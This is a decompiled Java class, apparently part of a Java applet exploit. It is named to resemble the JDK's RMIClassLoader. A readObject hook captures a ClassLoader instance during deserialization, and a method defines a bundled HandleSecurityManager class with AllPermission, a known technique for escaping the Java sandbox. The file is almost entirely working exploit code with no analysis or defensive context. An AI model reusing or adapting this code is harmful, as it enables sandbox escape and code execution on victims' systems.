import java.io.InputStream;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.cert.Certificate;
import java.net.URL;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class RMIClassLoader extends ClassLoader implements JavaSerial
{
    private static final long serialVersionUID = 9160024682572578241L;
    public static RMIClassLoader instance;
    
    private void writeObject(final ObjectOutputStream pObjectOutputStream) throws IOException, ClassNotFoundException {
        pObjectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream pObjectInputStream) throws IOException, ClassNotFoundException {
        RMIClassLoader.instance = this;
        pObjectInputStream.defaultReadObject();
    }
    
    public void LoadSecurityManager() throws Exception {
        int readLength = 0;
        final ByteArrayOutputStream lObject1 = new ByteArrayOutputStream();
        byte[] lObject2 = new byte[8192];
        final InputStream lObject3 = this.getClass().getResourceAsStream("/HandleSecurityManager.class");
        while ((readLength = lObject3.read(lObject2)) > 0) {
            lObject1.write(lObject2, 0, readLength);
        }
        lObject2 = lObject1.toByteArray();
        final Permissions lPermissions = new Permissions();
        lPermissions.add(new AllPermission());
        final ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), lPermissions);
        this.defineClass("HandleSecurityManager", lObject2, 0, lObject2.length, localProtectionDomain).newInstance();
    }
    
    static {
        RMIClassLoader.instance = null;
    }
}
